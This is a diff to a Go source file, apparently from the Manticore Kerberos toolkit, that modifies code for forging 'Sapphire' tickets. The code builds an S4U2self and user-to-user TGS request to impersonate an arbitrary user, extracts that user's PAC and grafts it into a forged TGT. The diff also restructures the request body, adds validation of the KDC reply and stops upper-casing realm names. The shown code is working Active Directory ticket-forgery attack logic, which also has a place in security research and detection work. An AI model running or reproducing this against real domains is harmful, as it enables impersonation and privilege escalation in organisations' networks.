@@ -4,7 +4,6 @@ import (
 	"crypto/rand"
 	"encoding/binary"
 	"fmt"
-	"strings"
 	"time"
 
 	kerbcrypto "github.com/TheManticoreProject/Manticore/network/kerberos/v5/crypto"
@@ -219,8 +218,6 @@ func (c *KerberosClient) ForgeSapphire(opts SapphireOptions) (*ForgedTicket, err
 func (c *KerberosClient) buildSapphireTGSReq(impersonateUser, impersonateRealm string, nonce int) (*messages.TGSReq, error) {
 	if impersonateRealm == "" {
 		impersonateRealm = c.realm
-	} else {
-		impersonateRealm = strings.ToUpper(impersonateRealm)
 	}
 
 	userName := messages.PrincipalName{
@@ -232,14 +229,32 @@ func (c *KerberosClient) buildSapphireTGSReq(impersonateUser, impersonateRealm s
 		return nil, fmt.Errorf("kerberos: build PA-FOR-USER: %w", err)
 	}
 
-	apReqBytes, err := c.buildAPReq()
-	if err != nil {
-		return nil, fmt.Errorf("kerberos: build AP-REQ: %w", err)
-	}
-
 	self := messages.PrincipalName{
 		NameType:   messages.NameTypePrincipal,
 		NameString: []string{c.username},
+	}
+
+	body := messages.KDCReqBody{
+		KDCOptions: encodeKDCOptions(
+			kdcOptionForwardable,
+			kdcOptionRenewable,
+			kdcOptionCanonicalize,
+			kdcOptionEncTktInSKey,
+		),
+		Realm: c.realm,
+		SName: self,
+		Till:  c.now().Add(24 * time.Hour),
+		Nonce: nonce,
+		EType: []int{
+			messages.ETypeAES256CTSHMACSHA196,
+			messages.ETypeAES128CTSHMACSHA196,
+			messages.ETypeRC4HMAC,
+		},
+		AdditTicketsRaw: [][]byte{c.tgtTicketRaw},
+	}
+	apReqBytes, err := c.buildAPReq(body)
+	if err != nil {
+		return nil, fmt.Errorf("kerberos: build AP-REQ: %w", err)
 	}
 
 	return &messages.TGSReq{
@@ -250,24 +265,7 @@ func (c *KerberosClient) buildSapphireTGSReq(impersonateUser, impersonateRealm s
 			paForUser,
 			{PADataType: messages.PAPACRequest, PADataValue: []byte{0x30, 0x05, 0xa0, 0x03, 0x01, 0x01, 0xff}},
 		},
-		ReqBody: messages.KDCReqBody{
-			KDCOptions: encodeKDCOptions(
-				kdcOptionForwardable,
-				kdcOptionRenewable,
-				kdcOptionCanonicalize,
-				kdcOptionEncTktInSKey,
-			),
-			Realm: c.realm,
-			SName: self,
-			Till:  c.now().Add(24 * time.Hour),
-			Nonce: nonce,
-			EType: []int{
-				messages.ETypeAES256CTSHMACSHA196,
-				messages.ETypeAES128CTSHMACSHA196,
-				messages.ETypeRC4HMAC,
-			},
-			AdditTicketsRaw: [][]byte{c.tgtTicketRaw},
-		},
+		ReqBody: body,
 	}, nil
 }
 
@@ -313,6 +311,15 @@ func (c *KerberosClient) harvestPACViaS4USelfU2U(impersonateUser, impersonateRea
 	if encTGSRep.Nonce != nonce {
 		return nil, messages.PrincipalName{}, "", fmt.Errorf("kerberos: sapphire nonce mismatch: got %d, want %d", encTGSRep.Nonce, nonce)
 	}
+	if err := c.validateKDCReplyIdentity("sapphire TGS-REP", tgsRep.CRealm, tgsRep.CName, tgsRep.Ticket, encTGSRep.SRealm, encTGSRep.SName); err != nil {
+		return nil, messages.PrincipalName{}, "", err
+	}
+	if err := validateKDCReplyServer("sapphire TGS-REP", tgsRep.Ticket, c.realm, tgsReq.ReqBody.SName, false); err != nil {
+		return nil, messages.PrincipalName{}, "", err
+	}
+	if err := validateKDCReplyAddresses("sapphire TGS-REP", encTGSRep.CAddr, nil); err != nil {
+		return nil, messages.PrincipalName{}, "", err
+	}
 
 	// ENC-TKT-IN-SKEY: the issued ticket's enc-part is encrypted under our TGT
 	// session key (usage 2), not a long-term key, so we can decrypt it.
@@ -351,9 +358,8 @@ func extractPACFromTicket(ticket messages.Ticket, etype int, key []byte) ([]byte
 func graftPACIntoTGT(pacBytes []byte, cname messages.PrincipalName, crealm string, opts SapphireOptions) (*ForgedTicket, error) {
 	realm := crealm
 	if opts.ImpersonateRealm != "" {
-		realm = strings.ToUpper(opts.ImpersonateRealm)
+		realm = opts.ImpersonateRealm
 	}
-	realm = strings.ToUpper(realm)
 	if realm == "" {
 		return nil, fmt.Errorf("kerberos: forge sapphire: could not determine realm for grafted ticket")
 	}
